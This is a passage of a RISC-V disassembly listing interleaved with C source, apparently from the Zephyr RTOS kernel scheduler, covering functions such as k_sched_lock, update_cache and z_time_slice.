80044724:	2487a783          	lw	a5,584(a5) # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>

void z_reschedule_irqlock(u32_t key)
{
	if (resched()) {
80044728:	c789                	beqz	a5,80044732 <z_reschedule_irqlock+0x12>
			  : "r" (key & SOC_MSTATUS_IEN)
8004472a:	8921                	andi	a0,a0,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
8004472c:	30052573          	csrrs	a0,mstatus,a0
80044730:	8082                	ret
{
80044732:	1141                	addi	sp,sp,-16
80044734:	c606                	sw	ra,12(sp)
80044736:	a93fb0ef          	jal	ra,800401c8 <__swap>
		z_swap_irqlock(key);
	} else {
		irq_unlock(key);
	}
}
8004473a:	40b2                	lw	ra,12(sp)
8004473c:	0141                	addi	sp,sp,16
8004473e:	8082                	ret

80044740 <k_sched_lock>:

void k_sched_lock(void)
{
80044740:	1141                	addi	sp,sp,-16
80044742:	c606                	sw	ra,12(sp)
80044744:	c422                	sw	s0,8(sp)
	LOCKED(&sched_spinlock) {
80044746:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80044748:	4421                	li	s0,8
8004474a:	30043473          	csrrc	s0,mstatus,s0
8004474e:	8821                	andi	s0,s0,8
80044750:	ef95                	bnez	a5,8004478c <k_sched_lock+0x4c>
{
#ifdef CONFIG_PREEMPT_ENABLED
	__ASSERT(!z_is_in_isr(), "");
	__ASSERT(_current->base.sched_locked != 1, "");

	--_current->base.sched_locked;
80044752:	800477b7          	lui	a5,0x80047
80044756:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
8004475a:	4794                	lw	a3,8(a5)
8004475c:	00f6c703          	lbu	a4,15(a3)
80044760:	177d                	addi	a4,a4,-1
80044762:	00e687a3          	sb	a4,15(a3)

	compiler_barrier();

	K_DEBUG("scheduler locked (%p:%d)\n",
80044766:	4790                	lw	a2,8(a5)
80044768:	00f64683          	lbu	a3,15(a2) # 100f <CONFIG_ISR_STACK_SIZE+0xf>
8004476c:	800465b7          	lui	a1,0x80046
80044770:	42058593          	addi	a1,a1,1056 # 80046420 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046421>
80044774:	80046537          	lui	a0,0x80046
80044778:	44050513          	addi	a0,a0,1088 # 80046440 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046441>
8004477c:	921ff0ef          	jal	ra,8004409c <printk>
			  : "r" (key & SOC_MSTATUS_IEN)
80044780:	00847793          	andi	a5,s0,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
80044784:	3007a7f3          	csrrs	a5,mstatus,a5
80044788:	4785                	li	a5,1
8004478a:	b7d9                	j	80044750 <k_sched_lock+0x10>
		z_sched_lock();
	}
}
8004478c:	40b2                	lw	ra,12(sp)
8004478e:	4422                	lw	s0,8(sp)
80044790:	0141                	addi	sp,sp,16
80044792:	8082                	ret

80044794 <z_priq_dumb_remove>:
 * @return N/A
 */

static inline void sys_dlist_remove(sys_dnode_t *node)
{
	node->prev->next = node->next;
80044794:	41d8                	lw	a4,4(a1)
80044796:	419c                	lw	a5,0(a1)
80044798:	c31c                	sw	a5,0(a4)
	node->next->prev = node->prev;
8004479a:	41d8                	lw	a4,4(a1)
8004479c:	c3d8                	sw	a4,4(a5)
	node->next = NULL;
8004479e:	0005a023          	sw	zero,0(a1)
	node->prev = NULL;
800447a2:	0005a223          	sw	zero,4(a1)
#endif

	__ASSERT_NO_MSG(!is_idle(thread));

	sys_dlist_remove(&thread->base.qnode_dlist);
}
800447a6:	8082                	ret

800447a8 <z_priq_dumb_best>:
	return list->head == list;
800447a8:	411c                	lw	a5,0(a0)
	return sys_dlist_is_empty(list) ? NULL : list->head;
800447aa:	00f50463          	beq	a0,a5,800447b2 <z_priq_dumb_best+0xa>

	if (n != NULL) {
		t = CONTAINER_OF(n, struct k_thread, base.qnode_dlist);
	}
	return t;
}
800447ae:	853e                	mv	a0,a5
800447b0:	8082                	ret
	struct k_thread *t = NULL;
800447b2:	4781                	li	a5,0
	return t;
800447b4:	bfed                	j	800447ae <z_priq_dumb_best+0x6>

800447b6 <update_cache>:
{
800447b6:	1141                	addi	sp,sp,-16
800447b8:	c606                	sw	ra,12(sp)
800447ba:	c422                	sw	s0,8(sp)
800447bc:	c226                	sw	s1,4(sp)
800447be:	84aa                	mv	s1,a0
	struct k_thread *th = _priq_run_best(&_kernel.ready_q.runq);
800447c0:	80047537          	lui	a0,0x80047
800447c4:	24850513          	addi	a0,a0,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
800447c8:	02450513          	addi	a0,a0,36
800447cc:	3ff1                	jal	800447a8 <z_priq_dumb_best>
800447ce:	842a                	mv	s0,a0
	return th ? th : _current_cpu->idle_thread;
800447d0:	c51d                	beqz	a0,800447fe <update_cache+0x48>
	if (preempt_ok != 0) {
800447d2:	ec85                	bnez	s1,8004480a <update_cache+0x54>
	if (z_is_thread_prevented_from_running(_current)) {
800447d4:	800477b7          	lui	a5,0x80047
800447d8:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
800447dc:	4798                	lw	a4,8(a5)
	u8_t state = thread->base.thread_state;
800447de:	00d74783          	lbu	a5,13(a4)
800447e2:	8bfd                	andi	a5,a5,31
800447e4:	e39d                	bnez	a5,8004480a <update_cache+0x54>
	return thread->base.preempt <= _PREEMPT_THRESHOLD;
800447e6:	00e75683          	lhu	a3,14(a4)
	if (is_preempt(_current) || is_metairq(th)) {
800447ea:	07f00793          	li	a5,127
800447ee:	00d7fe63          	bgeu	a5,a3,8004480a <update_cache+0x54>
		_kernel.ready_q.cache = _current;
800447f2:	800477b7          	lui	a5,0x80047
800447f6:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
800447fa:	d398                	sw	a4,32(a5)
800447fc:	a025                	j	80044824 <update_cache+0x6e>
	return th ? th : _current_cpu->idle_thread;
800447fe:	800477b7          	lui	a5,0x80047
80044802:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044806:	47c0                	lw	s0,12(a5)
80044808:	b7e9                	j	800447d2 <update_cache+0x1c>
		if (th != _current) {
8004480a:	800477b7          	lui	a5,0x80047
8004480e:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044812:	479c                	lw	a5,8(a5)
80044814:	00878363          	beq	a5,s0,8004481a <update_cache+0x64>
			reset_time_slice();
80044818:	3531                	jal	80044624 <reset_time_slice>
		_kernel.ready_q.cache = th;
8004481a:	800477b7          	lui	a5,0x80047
8004481e:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044822:	d380                	sw	s0,32(a5)
}
80044824:	40b2                	lw	ra,12(sp)
80044826:	4422                	lw	s0,8(sp)
80044828:	4492                	lw	s1,4(sp)
8004482a:	0141                	addi	sp,sp,16
8004482c:	8082                	ret

8004482e <k_sched_unlock>:
{
8004482e:	1141                	addi	sp,sp,-16
80044830:	c606                	sw	ra,12(sp)
80044832:	c422                	sw	s0,8(sp)
	LOCKED(&sched_spinlock) {
80044834:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80044836:	4421                	li	s0,8
80044838:	30043473          	csrrc	s0,mstatus,s0
8004483c:	8821                	andi	s0,s0,8
8004483e:	e39d                	bnez	a5,80044864 <k_sched_unlock+0x36>
		++_current->base.sched_locked;
80044840:	800477b7          	lui	a5,0x80047
80044844:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044848:	4798                	lw	a4,8(a5)
8004484a:	00f74783          	lbu	a5,15(a4)
8004484e:	0785                	addi	a5,a5,1
80044850:	00f707a3          	sb	a5,15(a4)
		update_cache(1);
80044854:	4505                	li	a0,1
80044856:	3785                	jal	800447b6 <update_cache>
			  : "r" (key & SOC_MSTATUS_IEN)
80044858:	00847793          	andi	a5,s0,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
8004485c:	3007a7f3          	csrrs	a5,mstatus,a5
	LOCKED(&sched_spinlock) {
80044860:	4785                	li	a5,1
80044862:	bff1                	j	8004483e <k_sched_unlock+0x10>
	K_DEBUG("scheduler unlocked (%p:%d)\n",
80044864:	800477b7          	lui	a5,0x80047
80044868:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
8004486c:	4790                	lw	a2,8(a5)
8004486e:	00f64683          	lbu	a3,15(a2)
80044872:	800465b7          	lui	a1,0x80046
80044876:	43058593          	addi	a1,a1,1072 # 80046430 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046431>
8004487a:	80046537          	lui	a0,0x80046
8004487e:	46050513          	addi	a0,a0,1120 # 80046460 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046461>
80044882:	81bff0ef          	jal	ra,8004409c <printk>
	__asm__ volatile ("csrrc %0, mstatus, %1"
80044886:	4521                	li	a0,8
80044888:	30053573          	csrrc	a0,mstatus,a0
	(void) z_reschedule_irqlock(z_arch_irq_lock());
8004488c:	8921                	andi	a0,a0,8
8004488e:	3d49                	jal	80044720 <z_reschedule_irqlock>
}
80044890:	40b2                	lw	ra,12(sp)
80044892:	4422                	lw	s0,8(sp)
80044894:	0141                	addi	sp,sp,16
80044896:	8082                	ret

80044898 <z_add_thread_to_ready_q>:
{
80044898:	1141                	addi	sp,sp,-16
8004489a:	c606                	sw	ra,12(sp)
8004489c:	c422                	sw	s0,8(sp)
8004489e:	c226                	sw	s1,4(sp)
800448a0:	c04a                	sw	s2,0(sp)
800448a2:	84aa                	mv	s1,a0
	LOCKED(&sched_spinlock) {
800448a4:	4781                	li	a5,0
800448a6:	4921                	li	s2,8
800448a8:	30093973          	csrrc	s2,mstatus,s2
800448ac:	00897913          	andi	s2,s2,8
800448b0:	a091                	j	800448f4 <z_add_thread_to_ready_q+0x5c>
	node->prev = successor->prev;
800448b2:	405c                	lw	a5,4(s0)
800448b4:	c0dc                	sw	a5,4(s1)
	node->next = successor;
800448b6:	c080                	sw	s0,0(s1)
	successor->prev->next = node;
800448b8:	405c                	lw	a5,4(s0)
800448ba:	c384                	sw	s1,0(a5)
	successor->prev = node;
800448bc:	c044                	sw	s1,4(s0)
800448be:	a831                	j	800448da <z_add_thread_to_ready_q+0x42>
	SYS_DLIST_FOR_EACH_CONTAINER(pq, t, base.qnode_dlist) {
800448c0:	4401                	li	s0,0
800448c2:	a099                	j	80044908 <z_add_thread_to_ready_q+0x70>
	node->next = list;
800448c4:	800477b7          	lui	a5,0x80047
800448c8:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
800448cc:	02478713          	addi	a4,a5,36
800448d0:	c098                	sw	a4,0(s1)
	node->prev = list->tail;
800448d2:	5798                	lw	a4,40(a5)
800448d4:	c0d8                	sw	a4,4(s1)
	list->tail->next = node;
800448d6:	c304                	sw	s1,0(a4)
	list->tail = node;
800448d8:	d784                	sw	s1,40(a5)
	thread->base.thread_state |= states;
800448da:	00d4c783          	lbu	a5,13(s1)
800448de:	0407e793          	ori	a5,a5,64
800448e2:	00f486a3          	sb	a5,13(s1)
		update_cache(0);
800448e6:	4501                	li	a0,0
800448e8:	35f9                	jal	800447b6 <update_cache>
			  : "r" (key & SOC_MSTATUS_IEN)
800448ea:	00897793          	andi	a5,s2,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
800448ee:	3007a7f3          	csrrs	a5,mstatus,a5
	LOCKED(&sched_spinlock) {
800448f2:	4785                	li	a5,1
800448f4:	eb95                	bnez	a5,80044928 <z_add_thread_to_ready_q+0x90>
	return list->head == list;
800448f6:	800477b7          	lui	a5,0x80047
800448fa:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
800448fe:	53c0                	lw	s0,36(a5)
	return sys_dlist_is_empty(list) ? NULL : list->head;
80044900:	02478793          	addi	a5,a5,36
80044904:	faf40ee3          	beq	s0,a5,800448c0 <z_add_thread_to_ready_q+0x28>
	SYS_DLIST_FOR_EACH_CONTAINER(pq, t, base.qnode_dlist) {
80044908:	dc55                	beqz	s0,800448c4 <z_add_thread_to_ready_q+0x2c>
		if (z_is_t1_higher_prio_than_t2(thread, t)) {
8004490a:	85a2                	mv	a1,s0
8004490c:	8526                	mv	a0,s1
8004490e:	3381                	jal	8004464e <z_is_t1_higher_prio_than_t2>
80044910:	f14d                	bnez	a0,800448b2 <z_add_thread_to_ready_q+0x1a>
	return (node != NULL) ? sys_dlist_peek_next_no_check(list, node) : NULL;
80044912:	d84d                	beqz	s0,800448c4 <z_add_thread_to_ready_q+0x2c>
	return (node == list->tail) ? NULL : node->next;
80044914:	800477b7          	lui	a5,0x80047
80044918:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
8004491c:	579c                	lw	a5,40(a5)
8004491e:	faf403e3          	beq	s0,a5,800448c4 <z_add_thread_to_ready_q+0x2c>
80044922:	4000                	lw	s0,0(s0)
	SYS_DLIST_FOR_EACH_CONTAINER(pq, t, base.qnode_dlist) {
80044924:	f075                	bnez	s0,80044908 <z_add_thread_to_ready_q+0x70>
80044926:	bf79                	j	800448c4 <z_add_thread_to_ready_q+0x2c>
}
80044928:	40b2                	lw	ra,12(sp)
8004492a:	4422                	lw	s0,8(sp)
8004492c:	4492                	lw	s1,4(sp)
8004492e:	4902                	lw	s2,0(sp)
80044930:	0141                	addi	sp,sp,16
80044932:	8082                	ret

80044934 <z_thread_timeout>:
{
80044934:	1141                	addi	sp,sp,-16
80044936:	c606                	sw	ra,12(sp)
80044938:	c422                	sw	s0,8(sp)
8004493a:	c226                	sw	s1,4(sp)
8004493c:	c04a                	sw	s2,0(sp)
8004493e:	842a                	mv	s0,a0
	struct k_thread *th = CONTAINER_OF(to, struct k_thread, base.timeout);
80044940:	fe850493          	addi	s1,a0,-24
	if (th->base.pended_on != NULL) {
80044944:	ff052783          	lw	a5,-16(a0)
80044948:	cb95                	beqz	a5,8004497c <z_thread_timeout+0x48>
	LOCKED(&sched_spinlock) {
8004494a:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
8004494c:	4921                	li	s2,8
8004494e:	30093973          	csrrc	s2,mstatus,s2
80044952:	00897913          	andi	s2,s2,8
80044956:	e38d                	bnez	a5,80044978 <z_thread_timeout+0x44>
		_priq_wait_remove(&pended_on(thread)->waitq, thread);
80044958:	8526                	mv	a0,s1
8004495a:	cc7ff0ef          	jal	ra,80044620 <pended_on>
8004495e:	85a6                	mv	a1,s1
80044960:	3d15                	jal	80044794 <z_priq_dumb_remove>
	thread->base.thread_state &= ~_THREAD_PENDING;
80044962:	ff544783          	lbu	a5,-11(s0)
80044966:	9bf5                	andi	a5,a5,-3
80044968:	fef40aa3          	sb	a5,-11(s0)
			  : "r" (key & SOC_MSTATUS_IEN)
8004496c:	00897793          	andi	a5,s2,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
80044970:	3007a7f3          	csrrs	a5,mstatus,a5
	LOCKED(&sched_spinlock) {
80044974:	4785                	li	a5,1
80044976:	b7c5                	j	80044956 <z_thread_timeout+0x22>
	thread->base.pended_on = NULL;
80044978:	fe042823          	sw	zero,-16(s0)
	thread->base.thread_state &= ~_THREAD_PRESTART;
8004497c:	ff544783          	lbu	a5,-11(s0)
	thread->base.thread_state &= ~_THREAD_SUSPENDED;
80044980:	0eb7f793          	andi	a5,a5,235
80044984:	fef40aa3          	sb	a5,-11(s0)
	return !((z_is_thread_prevented_from_running(thread)) != 0 ||
80044988:	8bad                	andi	a5,a5,11
8004498a:	e799                	bnez	a5,80044998 <z_thread_timeout+0x64>
	return node->next != NULL;
8004498c:	401c                	lw	a5,0(s0)
8004498e:	c399                	beqz	a5,80044994 <z_thread_timeout+0x60>
80044990:	4781                	li	a5,0
80044992:	a021                	j	8004499a <z_thread_timeout+0x66>
80044994:	4785                	li	a5,1
80044996:	a011                	j	8004499a <z_thread_timeout+0x66>
80044998:	4781                	li	a5,0
	if (z_is_thread_ready(thread)) {
8004499a:	e799                	bnez	a5,800449a8 <z_thread_timeout+0x74>
}
8004499c:	40b2                	lw	ra,12(sp)
8004499e:	4422                	lw	s0,8(sp)
800449a0:	4492                	lw	s1,4(sp)
800449a2:	4902                	lw	s2,0(sp)
800449a4:	0141                	addi	sp,sp,16
800449a6:	8082                	ret
		z_add_thread_to_ready_q(thread);
800449a8:	8526                	mv	a0,s1
800449aa:	35fd                	jal	80044898 <z_add_thread_to_ready_q>
800449ac:	bfc5                	j	8004499c <z_thread_timeout+0x68>

800449ae <z_move_thread_to_end_of_prio_q>:
{
800449ae:	1101                	addi	sp,sp,-32
800449b0:	ce06                	sw	ra,28(sp)
800449b2:	cc22                	sw	s0,24(sp)
800449b4:	ca26                	sw	s1,20(sp)
800449b6:	c84a                	sw	s2,16(sp)
800449b8:	c64e                	sw	s3,12(sp)
800449ba:	84aa                	mv	s1,a0
	LOCKED(&sched_spinlock) {
800449bc:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
800449be:	4921                	li	s2,8
800449c0:	30093973          	csrrc	s2,mstatus,s2
800449c4:	00897913          	andi	s2,s2,8
800449c8:	a889                	j	80044a1a <z_move_thread_to_end_of_prio_q+0x6c>
	node->prev = successor->prev;
800449ca:	405c                	lw	a5,4(s0)
800449cc:	c0dc                	sw	a5,4(s1)
	node->next = successor;
800449ce:	c080                	sw	s0,0(s1)
	successor->prev->next = node;
800449d0:	405c                	lw	a5,4(s0)
800449d2:	c384                	sw	s1,0(a5)
	successor->prev = node;
800449d4:	c044                	sw	s1,4(s0)
800449d6:	a831                	j	800449f2 <z_move_thread_to_end_of_prio_q+0x44>
	SYS_DLIST_FOR_EACH_CONTAINER(pq, t, base.qnode_dlist) {
800449d8:	4401                	li	s0,0
800449da:	a8a9                	j	80044a34 <z_move_thread_to_end_of_prio_q+0x86>
	node->next = list;
800449dc:	800477b7          	lui	a5,0x80047
800449e0:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
800449e4:	02478713          	addi	a4,a5,36
800449e8:	c098                	sw	a4,0(s1)
	node->prev = list->tail;
800449ea:	5798                	lw	a4,40(a5)
800449ec:	c0d8                	sw	a4,4(s1)
	list->tail->next = node;
800449ee:	c304                	sw	s1,0(a4)
	list->tail = node;
800449f0:	d784                	sw	s1,40(a5)
	thread->base.thread_state |= states;
800449f2:	00d4c783          	lbu	a5,13(s1)
800449f6:	0407e793          	ori	a5,a5,64
800449fa:	00f486a3          	sb	a5,13(s1)
		update_cache(thread == _current);
800449fe:	800477b7          	lui	a5,0x80047
80044a02:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044a06:	4788                	lw	a0,8(a5)
80044a08:	8d05                	sub	a0,a0,s1
80044a0a:	00153513          	seqz	a0,a0
80044a0e:	3365                	jal	800447b6 <update_cache>
			  : "r" (key & SOC_MSTATUS_IEN)
80044a10:	00897793          	andi	a5,s2,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
80044a14:	3007a7f3          	csrrs	a5,mstatus,a5
	LOCKED(&sched_spinlock) {
80044a18:	4785                	li	a5,1
80044a1a:	ef95                	bnez	a5,80044a56 <z_move_thread_to_end_of_prio_q+0xa8>
		_priq_run_remove(&_kernel.ready_q.runq, thread);
80044a1c:	80047437          	lui	s0,0x80047
80044a20:	24840413          	addi	s0,s0,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044a24:	02440993          	addi	s3,s0,36
80044a28:	85a6                	mv	a1,s1
80044a2a:	854e                	mv	a0,s3
80044a2c:	33a5                	jal	80044794 <z_priq_dumb_remove>
	return list->head == list;
80044a2e:	5040                	lw	s0,36(s0)
	return sys_dlist_is_empty(list) ? NULL : list->head;
80044a30:	fb3404e3          	beq	s0,s3,800449d8 <z_move_thread_to_end_of_prio_q+0x2a>
	SYS_DLIST_FOR_EACH_CONTAINER(pq, t, base.qnode_dlist) {
80044a34:	d445                	beqz	s0,800449dc <z_move_thread_to_end_of_prio_q+0x2e>
		if (z_is_t1_higher_prio_than_t2(thread, t)) {
80044a36:	85a2                	mv	a1,s0
80044a38:	8526                	mv	a0,s1
80044a3a:	c15ff0ef          	jal	ra,8004464e <z_is_t1_higher_prio_than_t2>
80044a3e:	f551                	bnez	a0,800449ca <z_move_thread_to_end_of_prio_q+0x1c>
	return (node != NULL) ? sys_dlist_peek_next_no_check(list, node) : NULL;
80044a40:	dc51                	beqz	s0,800449dc <z_move_thread_to_end_of_prio_q+0x2e>
	return (node == list->tail) ? NULL : node->next;
80044a42:	800477b7          	lui	a5,0x80047
80044a46:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044a4a:	579c                	lw	a5,40(a5)
80044a4c:	f8f408e3          	beq	s0,a5,800449dc <z_move_thread_to_end_of_prio_q+0x2e>
80044a50:	4000                	lw	s0,0(s0)
	SYS_DLIST_FOR_EACH_CONTAINER(pq, t, base.qnode_dlist) {
80044a52:	f06d                	bnez	s0,80044a34 <z_move_thread_to_end_of_prio_q+0x86>
80044a54:	b761                	j	800449dc <z_move_thread_to_end_of_prio_q+0x2e>
}
80044a56:	40f2                	lw	ra,28(sp)
80044a58:	4462                	lw	s0,24(sp)
80044a5a:	44d2                	lw	s1,20(sp)
80044a5c:	4942                	lw	s2,16(sp)
80044a5e:	49b2                	lw	s3,12(sp)
80044a60:	6105                	addi	sp,sp,32
80044a62:	8082                	ret

80044a64 <z_time_slice>:
	if (slice_time && sliceable(_current)) {
80044a64:	800477b7          	lui	a5,0x80047
80044a68:	dc47a783          	lw	a5,-572(a5) # 80046dc4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dc5>
80044a6c:	cf85                	beqz	a5,80044aa4 <z_time_slice+0x40>
80044a6e:	800477b7          	lui	a5,0x80047
80044a72:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044a76:	479c                	lw	a5,8(a5)
	return thread->base.preempt <= _PREEMPT_THRESHOLD;
80044a78:	00e7d683          	lhu	a3,14(a5)
		&& !z_is_thread_timeout_active(t);
80044a7c:	07f00713          	li	a4,127
80044a80:	02d76263          	bltu	a4,a3,80044aa4 <z_time_slice+0x40>
		&& !z_is_prio_higher(t->base.prio, slice_max_prio)
80044a84:	00e78683          	lb	a3,14(a5)
80044a88:	80047737          	lui	a4,0x80047
80044a8c:	dc072703          	lw	a4,-576(a4) # 80046dc0 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046dc1>
80044a90:	00e6ca63          	blt	a3,a4,80044aa4 <z_time_slice+0x40>
	return thread == _idle_thread;
80044a94:	80047737          	lui	a4,0x80047
80044a98:	d4072703          	lw	a4,-704(a4) # 80046d40 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d41>
		&& !is_idle(t)
80044a9c:	00e78463          	beq	a5,a4,80044aa4 <z_time_slice+0x40>
	return node->next != NULL;
80044aa0:	4f98                	lw	a4,24(a5)
		&& !z_is_thread_timeout_active(t);
80044aa2:	c311                	beqz	a4,80044aa6 <z_time_slice+0x42>
80044aa4:	8082                	ret
		if (ticks >= _current_cpu->slice_ticks) {
80044aa6:	80047737          	lui	a4,0x80047
80044aaa:	24870713          	addi	a4,a4,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044aae:	4b18                	lw	a4,16(a4)
80044ab0:	00e55a63          	bge	a0,a4,80044ac4 <z_time_slice+0x60>
			_current_cpu->slice_ticks -= ticks;
80044ab4:	40a70533          	sub	a0,a4,a0
80044ab8:	800477b7          	lui	a5,0x80047
80044abc:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044ac0:	cb88                	sw	a0,16(a5)
}
80044ac2:	8082                	ret
{
80044ac4:	1141                	addi	sp,sp,-16
80044ac6:	c606                	sw	ra,12(sp)
			z_move_thread_to_end_of_prio_q(_current);
80044ac8:	853e                	mv	a0,a5
80044aca:	35d5                	jal	800449ae <z_move_thread_to_end_of_prio_q>
			reset_time_slice();
80044acc:	b59ff0ef          	jal	ra,80044624 <reset_time_slice>
}
80044ad0:	40b2                	lw	ra,12(sp)
80044ad2:	0141                	addi	sp,sp,16
80044ad4:	8082                	ret

80044ad6 <z_remove_thread_from_ready_q>:
{
80044ad6:	1141                	addi	sp,sp,-16
80044ad8:	c606                	sw	ra,12(sp)
80044ada:	c422                	sw	s0,8(sp)
80044adc:	c226                	sw	s1,4(sp)
80044ade:	842a                	mv	s0,a0
	LOCKED(&sched_spinlock) {
80044ae0:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80044ae2:	44a1                	li	s1,8
80044ae4:	3004b4f3          	csrrc	s1,mstatus,s1
80044ae8:	88a1                	andi	s1,s1,8
80044aea:	a83d                	j	80044b28 <z_remove_thread_from_ready_q+0x52>
			_priq_run_remove(&_kernel.ready_q.runq, thread);
80044aec:	85a2                	mv	a1,s0
80044aee:	80047537          	lui	a0,0x80047
80044af2:	24850513          	addi	a0,a0,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044af6:	02450513          	addi	a0,a0,36
80044afa:	c9bff0ef          	jal	ra,80044794 <z_priq_dumb_remove>
	thread->base.thread_state &= ~states;
80044afe:	00d44783          	lbu	a5,13(s0)
80044b02:	fbf7f793          	andi	a5,a5,-65
80044b06:	00f406a3          	sb	a5,13(s0)
		update_cache(thread == _current);
80044b0a:	800477b7          	lui	a5,0x80047
80044b0e:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044b12:	4788                	lw	a0,8(a5)
80044b14:	8d01                	sub	a0,a0,s0
80044b16:	00153513          	seqz	a0,a0
80044b1a:	c9dff0ef          	jal	ra,800447b6 <update_cache>
			  : "r" (key & SOC_MSTATUS_IEN)
80044b1e:	0084f793          	andi	a5,s1,8
	__asm__ volatile ("csrrs %0, mstatus, %1"
80044b22:	3007a7f3          	csrrs	a5,mstatus,a5
	LOCKED(&sched_spinlock) {
80044b26:	4785                	li	a5,1
80044b28:	e799                	bnez	a5,80044b36 <z_remove_thread_from_ready_q+0x60>
	return (thread->base.thread_state & state) != 0U;
80044b2a:	00d44783          	lbu	a5,13(s0)
		if (z_is_thread_queued(thread)) {
80044b2e:	0407f793          	andi	a5,a5,64
80044b32:	dfe1                	beqz	a5,80044b0a <z_remove_thread_from_ready_q+0x34>
80044b34:	bf65                	j	80044aec <z_remove_thread_from_ready_q+0x16>
}
80044b36:	40b2                	lw	ra,12(sp)
80044b38:	4422                	lw	s0,8(sp)
80044b3a:	4492                	lw	s1,4(sp)
80044b3c:	0141                	addi	sp,sp,16
80044b3e:	8082                	ret

80044b40 <z_sched_init>:

	return need_sched;
}

void z_sched_init(void)
{
80044b40:	1141                	addi	sp,sp,-16
80044b42:	c606                	sw	ra,12(sp)
	list->head = (sys_dnode_t *)list;
80044b44:	800477b7          	lui	a5,0x80047
80044b48:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044b4c:	02478713          	addi	a4,a5,36
80044b50:	d3d8                	sw	a4,36(a5)
	list->tail = (sys_dnode_t *)list;
80044b52:	d798                	sw	a4,40(a5)
		sys_dlist_init(&_kernel.ready_q.runq.queues[i]);
	}
#endif

#ifdef CONFIG_TIMESLICING
	k_sched_time_slice_set(CONFIG_TIMESLICE_SIZE,
80044b54:	4581                	li	a1,0
80044b56:	4501                	li	a0,0
80044b58:	b0bff0ef          	jal	ra,80044662 <k_sched_time_slice_set>
		CONFIG_TIMESLICE_PRIORITY);
#endif
}
80044b5c:	40b2                	lw	ra,12(sp)
80044b5e:	0141                	addi	sp,sp,16
80044b60:	8082                	ret

80044b62 <z_impl_k_current_get>:
#endif

k_tid_t z_impl_k_current_get(void)
{
	return _current;
}
80044b62:	800477b7          	lui	a5,0x80047
80044b66:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044b6a:	4788                	lw	a0,8(a5)
80044b6c:	8082                	ret

80044b6e <k_is_in_isr>:
#endif
}

bool k_is_in_isr(void)
{
	return z_is_in_isr();
80044b6e:	800477b7          	lui	a5,0x80047
80044b72:	2487a503          	lw	a0,584(a5) # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
}
80044b76:	00a03533          	snez	a0,a0
80044b7a:	8082                	ret

80044b7c <z_is_thread_essential>:
 *
 * Returns true if current thread is essential, false if it is not.
 */
bool z_is_thread_essential(void)
{
	return (_current->base.user_options & K_ESSENTIAL) == K_ESSENTIAL;
80044b7c:	800477b7          	lui	a5,0x80047
80044b80:	24878793          	addi	a5,a5,584 # 80047248 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80047249>
80044b84:	479c                	lw	a5,8(a5)
80044b86:	00c7c503          	lbu	a0,12(a5)
